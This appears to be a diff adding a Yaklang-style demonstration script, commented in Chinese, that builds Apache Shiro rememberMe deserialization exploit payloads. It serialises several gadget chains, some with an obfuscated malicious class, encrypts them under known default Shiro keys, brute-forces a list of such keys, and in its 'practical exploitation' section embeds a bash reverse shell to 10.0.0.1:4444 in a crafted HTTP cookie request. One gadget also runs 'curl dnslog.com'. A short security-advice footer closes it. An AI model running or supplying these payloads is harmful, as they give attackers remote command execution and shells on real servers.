@@ -1,0 +1,355 @@
+/*
+Shiro Payload 生成器 - Java反序列化利用
+
+关键词: Shiro漏洞, Java反序列化, yso库, AES加密, CBC加密, GCM加密
+关键词: rememberMe Cookie, Gadget Chain, 命令执行, 回显注入, SimplePrincipalCollection
+关键词: CommonsCollections, CommonsBeanutils, 弱密钥爆破, PKCS5Padding
+*/
+
+println("\n=== Shiro Payload 生成器演示 ===\n")
+
+println("=== 一、SimplePrincipalCollection 检测 Payload ===\n")
+
+// 关键词: GetSimplePrincipalCollectionJavaObject, Shiro密钥检测
+println("[模拟场景] 生成用于检测 Shiro 密钥的 Payload")
+
+// 生成 SimplePrincipalCollection 对象（用于密钥验证）
+javaObject, err = yso.GetSimplePrincipalCollectionJavaObject()
+assert err == nil, "生成 SimplePrincipalCollection 失败"
+println("[1] ✓ 生成 SimplePrincipalCollection 对象成功")
+
+// 关键词: yso.ToBytes序列化Java对象
+classBytes, err = yso.ToBytes(javaObject)
+assert err == nil, "序列化失败"
+println(f"[2] ✓ 序列化成功，长度: ${len(classBytes)} 字节")
+
+// 关键词: codec.PKCS5Padding填充
+data = codec.PKCS5Padding(classBytes, 16)
+println(f"[3] ✓ PKCS5 填充完成，长度: ${len(data)} 字节")
+
+// 关键词: codec.AESCBCEncrypt, AES-128-CBC加密
+shiroKey = "kPH+bIxk5D2deZiIxcaaaA=="  // Shiro 默认密钥
+keyDecoded, err = codec.DecodeBase64(shiroKey)
+assert err == nil, "Base64解码密钥失败"
+
+iv = []byte(randstr(16))  // 16字节随机IV
+println(f"[4] ✓ 生成随机 IV: ${codec.EncodeToHex(iv)[:32]}...")
+
+// 使用 AES-128-CBC 加密
+cipherText, err = codec.AESCBCEncrypt(keyDecoded, data, iv)
+assert err == nil, "AES-CBC 加密失败"
+println("[5] ✓ AES-CBC 加密完成")
+
+// 构造 rememberMe Cookie
+payload = codec.EncodeBase64(append(iv, cipherText...))
+println(f"[6] rememberMe Cookie Payload (前50字符):\n    ${payload[:50]}...")
+
+println("\n[✓] SimplePrincipalCollection 检测 Payload 生成完成\n")
+
+println("=== 二、命令执行 Gadget - CommonsCollections1 ===\n")
+
+// 关键词: GetCommonsCollections1JavaObject, Runtime.exec命令执行
+println("[模拟场景] 生成 CommonsCollections1 命令执行 Payload")
+
+command = "whoami"
+println(f"[1] 目标命令: ${command}")
+
+// 关键词: yso.GetCommonsCollections1JavaObject
+gadgetObj, err = yso.GetCommonsCollections1JavaObject(command)
+assert err == nil, "生成 CC1 Gadget 失败"
+println("[2] ✓ 生成 CommonsCollections1 Gadget 成功")
+
+gadgetBytes, err = yso.ToBytes(gadgetObj)
+assert err == nil, "序列化 Gadget 失败"
+println(f"[3] ✓ Gadget 序列化完成，长度: ${len(gadgetBytes)} 字节")
+
+// 加密并生成 Payload
+gadgetData = codec.PKCS5Padding(gadgetBytes, 16)
+iv2 = []byte(randstr(16))
+cipherText2, err = codec.AESCBCEncrypt(keyDecoded, gadgetData, iv2)
+assert err == nil, "加密失败"
+
+cc1Payload = codec.EncodeBase64(append(iv2, cipherText2...))
+println(f"[4] CommonsCollections1 Payload (前50字符):\n    ${cc1Payload[:50]}...")
+
+println("\n[✓] CC1 命令执行 Payload 生成完成\n")
+
+println("=== 三、GCM 模式加密 (Shiro >= 1.4.2) ===\n")
+
+// 关键词: codec.AESGCMEncrypt, AES-GCM模式
+println("[模拟场景] 使用 GCM 模式生成 Payload (适用于 Shiro 1.4.2+)")
+
+gcmGadgetObj, err = yso.GetCommonsCollections5JavaObject("id")
+assert err == nil, "生成 CC5 Gadget 失败"
+println("[1] ✓ 生成 CommonsCollections5 Gadget")
+
+gcmBytes, err = yso.ToBytes(gcmGadgetObj)
+assert err == nil, "序列化失败"
+
+gcmData = codec.PKCS5Padding(gcmBytes, 16)
+println(f"[2] ✓ Gadget 序列化并填充，长度: ${len(gcmData)} 字节")
+
+// 关键词: AESGCMEncrypt无需IV
+gcmCipherText, err = codec.AESGCMEncrypt(keyDecoded, gcmData, nil)
+assert err == nil, "GCM 加密失败"
+println("[3] ✓ AES-GCM 加密完成 (无需 IV)")
+
+gcmPayload = codec.EncodeBase64(gcmCipherText)
+println(f"[4] GCM Payload (前50字符):\n    ${gcmPayload[:50]}...")
+
+println("\n[✓] GCM 模式 Payload 生成完成\n")
+
+println("=== 四、高级 Gadget - CommonsBeanutils ===\n")
+
+// 关键词: GetCommonsBeanutils192NOCCJavaObject, TemplateImpl模板注入
+println("[模拟场景] 使用 CommonsBeanutils 192 NoCC 生成 Payload")
+
+className = randstr(8)
+println(f"[1] 随机类名: ${className}")
+
+// 关键词: yso.useRuntimeExecEvilClass, yso.evilClassName, yso.obfuscationClassConstantPool
+cbGadgetObj, err = yso.GetCommonsBeanutils192NOCCJavaObject(
+    yso.useRuntimeExecEvilClass("curl dnslog.com"),  // 使用 Runtime.exec
+    yso.obfuscationClassConstantPool(),              // 混淆常量池
+    yso.evilClassName(className),                     // 自定义类名
+)
+assert err == nil, "生成 CB192NoCC Gadget 失败"
+println("[2] ✓ 生成 CommonsBeanutils192NoCC Gadget")
+println("    - 使用 Runtime.exec 命令执行")
+println("    - 常量池混淆")
+println(f"    - 恶意类名: ${className}")
+
+cbBytes, err = yso.ToBytes(cbGadgetObj)
+assert err == nil, "序列化失败"
+println(f"[3] ✓ 序列化完成，长度: ${len(cbBytes)} 字节")
+
+cbData = codec.PKCS5Padding(cbBytes, 16)
+iv3 = []byte(randstr(16))
+cbCipherText, err = codec.AESCBCEncrypt(keyDecoded, cbData, iv3)
+assert err == nil, "加密失败"
+
+cbPayload = codec.EncodeBase64(append(iv3, cbCipherText...))
+println(f"[4] CB192NoCC Payload (前50字符):\n    ${cbPayload[:50]}...")
+
+println("\n[✓] CommonsBeanutils Payload 生成完成\n")
+
+println("=== 五、所有 Gadget 类型展示 ===\n")
+
+// 关键词: yso.GetAllRuntimeExecGadget, Gadget爆破
+println("[展示] 所有支持 Runtime.exec 的 Gadget:")
+
+gadgetCount = 0
+for _, gadgetFunc := range yso.GetAllRuntimeExecGadget() {
+    obj, err := gadgetFunc("echo test")
+    if err == nil && obj != nil {
+        gadgetCount++
+        gadgetName = "Unknown"
+        if obj.Verbose() != nil {
+            gadgetName = obj.Verbose().GetName()
+        }
+        println(f"  [${gadgetCount}] ${gadgetName}")
+    }
+}
+
+println(f"\n[✓] 共支持 ${gadgetCount} 种 RuntimeExec Gadget\n")
+
+println("=== 六、URLDNS Gadget (无需依赖) ===\n")
+
+// 关键词: GetURLDNSJavaObject, DNS探测, 无依赖Gadget
+println("[模拟场景] 使用 URLDNS 进行 DNS 探测")
+
+dnslogDomain = "test.dnslog.cn"
+println(f"[1] DNS Log 域名: ${dnslogDomain}")
+
+// 关键词: yso.GetURLDNSJavaObject
+urldnsObj, err = yso.GetURLDNSJavaObject(dnslogDomain)
+assert err == nil, "生成 URLDNS Gadget 失败"
+println("[2] ✓ 生成 URLDNS Gadget 成功")
+println("    特点: 无需任何第三方库依赖")
+
+urldnsBytes, err = yso.ToBytes(urldnsObj)
+assert err == nil, "序列化失败"
+println(f"[3] ✓ URLDNS Payload 序列化完成，长度: ${len(urldnsBytes)} 字节")
+
+urldnsData = codec.PKCS5Padding(urldnsBytes, 16)
+iv4 = []byte(randstr(16))
+urldnsCipherText, err = codec.AESCBCEncrypt(keyDecoded, urldnsData, iv4)
+assert err == nil, "加密失败"
+
+urldnsPayload = codec.EncodeBase64(append(iv4, urldnsCipherText...))
+println(f"[4] URLDNS Payload (前50字符):\n    ${urldnsPayload[:50]}...")
+
+println("\n[✓] URLDNS Payload 生成完成\n")
+
+println("=== 七、Shiro 密钥爆破场景 ===\n")
+
+// 关键词: Shiro弱密钥字典, 密钥爆破
+println("[模拟场景] 批量生成多个密钥的检测 Payload")
+
+shiroKeys = [
+    "kPH+bIxk5D2deZiIxcaaaA==",
+    "4AvVhmFLUs0KTA3Kprsdag==",
+    "Z3VucwAAAAAAAAAAAAAAAA==",
+    "fCq+/xW488hMTCD+cmJ3aQ==",
+    "0AvVhmFLUs0KTA3Kprsdag==",
+]
+
+testObj, _ = yso.GetSimplePrincipalCollectionJavaObject()
+testBytes, _ = yso.ToBytes(testObj)
+testData = codec.PKCS5Padding(testBytes, 16)
+
+println(f"[1] 准备爆破 ${len(shiroKeys)} 个 Shiro 密钥")
+payloadMap = {}
+
+idx = 0
+for _, key := range shiroKeys {
+    keyBytes, err := codec.DecodeBase64(key)
+    if err != nil {
+        continue
+    }
+    
+    ivRand = []byte(randstr(16))
+    ciphered, err := codec.AESCBCEncrypt(keyBytes, testData, ivRand)
+    if err != nil {
+        continue
+    }
+    
+    idx++
+    brutePayload = codec.EncodeBase64(append(ivRand, ciphered...))
+    payloadMap[key] = brutePayload
+    println(f"  [${idx}] Key: ${key[:20]}... => Payload 长度: ${len(brutePayload)}")
+}
+
+println(f"\n[2] ✓ 成功生成 ${len(payloadMap)} 个爆破 Payload")
+
+println("\n[✓] 密钥爆破 Payload 生成完成\n")
+
+println("=== 八、实战利用示例 ===\n")
+
+// 关键词: HTTP请求构造, Cookie注入, rememberMe利用
+println("[实战示例] 构造完整的 Shiro 利用请求")
+
+targetUrl = "http://example.com:8080/login"
+println(f"[1] 目标地址: ${targetUrl}")
+
+attackGadget, _ = yso.GetCommonsCollections6JavaObject("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
+attackBytes, _ = yso.ToBytes(attackGadget)
+attackData = codec.PKCS5Padding(attackBytes, 16)
+keyAttack, _ = codec.DecodeBase64("kPH+bIxk5D2deZiIxcaaaA==")
+ivAttack = []byte(randstr(16))
+cipherAttack, _ = codec.AESCBCEncrypt(keyAttack, attackData, ivAttack)
+finalPayload = codec.EncodeBase64(append(ivAttack, cipherAttack...))
+
+println("[2] ✓ 生成反弹 Shell Payload")
+
+// 构造 HTTP 请求
+httpRequest = `GET /login HTTP/1.1
+Host: example.com:8080
+User-Agent: Mozilla/5.0
+Cookie: rememberMe=${finalPayload}
+Accept: */*
+Connection: close
+
+`
+
+println("[3] HTTP 请求示例:")
+println("--------------------")
+println(str.Split(httpRequest, "${finalPayload}")[0] + "[PAYLOAD_HERE]")
+println("--------------------")
+
+println(f"[4] Payload 长度: ${len(finalPayload)} 字节")
+println(f"[5] Gadget 类型: CommonsCollections6")
+println("[6] 攻击命令: bash 反弹 Shell")
+
+println("\n[✓] 实战利用示例完成\n")
+
+println("=== 九、Gadget 功能对比 ===\n")
+
+println("支持的主要 Gadget Chain:")
+println("1. CommonsCollections1-7  - Apache Commons Collections 3.x")
+println("2. CommonsCollectionsK1-K4 - Commons Collections (Kotlin)")
+println("3. CommonsBeanutils1/2    - Apache Commons Beanutils")
+println("4. CB183NoCC/CB192NoCC    - Beanutils 无 CC 依赖版本")
+println("5. BeanShell1             - BeanShell 脚本引擎")
+println("6. Groovy1                - Groovy 脚本引擎")
+println("7. Click1                 - Apache Click")
+println("8. JSON1                  - JSON 反序列化")
+println("9. Jdk7u21/Jdk8u20        - JDK 原生 Gadget")
+println("10. URLDNS                - DNS 探测")
+println("11. SimplePrincipalCollection - Shiro 密钥检测")
+
+println("\n特殊功能 Gadget:")
+println("- FindGadgetByDNS: 通过 DNS 探测可用 Gadget")
+println("- FindClassByBomb: 通过延时判断类是否存在")
+
+println("\n")
+
+println("=== 测试总结 ===\n")
+println("[✓] SimplePrincipalCollection 密钥检测")
+println("[✓] CommonsCollections1 命令执行")
+println("[✓] AES-GCM 模式加密 (Shiro 1.4.2+)")
+println("[✓] CommonsBeanutils 高级混淆")
+println("[✓] 所有 RuntimeExec Gadget 枚举")
+println("[✓] URLDNS 无依赖 DNS 探测")
+println("[✓] Shiro 弱密钥批量爆破")
+println("[✓] 实战 HTTP 请求构造")
+
+println("\nShiro Payload 生成器演示完成！\n")
+
+/*
+核心 API 总结:
+
+Gadget 生成:
+- yso.GetSimplePrincipalCollectionJavaObject() - 密钥检测
+- yso.GetCommonsCollections1JavaObject(cmd) - CC1 命令执行
+- yso.GetCommonsCollections5JavaObject(cmd) - CC5 命令执行
+- yso.GetCommonsCollections6JavaObject(cmd) - CC6 命令执行
+- yso.GetCommonsBeanutils192NOCCJavaObject(opts...) - CB192 无CC依赖
+- yso.GetCommonsCollectionsK1JavaObject(opts...) - CCK1 Kotlin版本
+- yso.GetAllRuntimeExecGadget() - 获取所有Runtime Gadget
+- yso.GetAllTemplatesGadget() - 获取所有模板Gadget
+
+Gadget 配置选项:
+- yso.useRuntimeExecEvilClass(cmd) - 使用 Runtime.exec 执行命令
+- yso.useDNSLogEvilClass(domain) - 使用 DNSLog 探测
+- yso.useBytesEvilClass(bytes) - 使用自定义字节码
+- yso.evilClassName(name) - 设置恶意类名
+- yso.obfuscationClassConstantPool() - 混淆常量池
+- yso.majorVersion(version) - 设置 Java 版本
+- yso.useClassParam(key, value) - 设置类参数
+
+序列化与编码:
+- yso.ToBytes(javaObj) - 将 Java 对象序列化为字节
+- codec.PKCS5Padding(data, blockSize) - PKCS5 填充
+- codec.DecodeBase64(str) - Base64 解码
+- codec.EncodeBase64(bytes) - Base64 编码
+- codec.EncodeToHex(bytes) - 十六进制编码
+
+加密操作:
+- codec.AESCBCEncrypt(key, data, iv) - AES-128-CBC 加密
+- codec.AESGCMEncrypt(key, data, nonce) - AES-128-GCM 加密
+
+Shiro 利用流程:
+1. 生成 SimplePrincipalCollection 对象用于密钥检测
+2. 序列化 Java 对象 (yso.ToBytes)
+3. PKCS5 填充到 16 字节块大小
+4. 使用 AES-CBC 或 AES-GCM 加密
+5. Base64 编码生成 rememberMe Cookie
+6. 发送 HTTP 请求到目标服务器
+7. 根据响应判断密钥是否正确
+
+常见 Shiro 默认密钥:
+- kPH+bIxk5D2deZiIxcaaaA==
+- 4AvVhmFLUs0KTA3Kprsdag==
+- Z3VucwAAAAAAAAAAAAAAAA==
+- fCq+/xW488hMTCD+cmJ3aQ==
+- (查看源码中 keyList 获取完整列表)
+
+安全建议:
+- Shiro <= 1.2.4 使用 AES-CBC 模式
+- Shiro >= 1.4.2 使用 AES-GCM 模式
+- 建议更换默认密钥
+- 升级到最新版本 Shiro
+- 禁用不必要的 rememberMe 功能
+*/
+
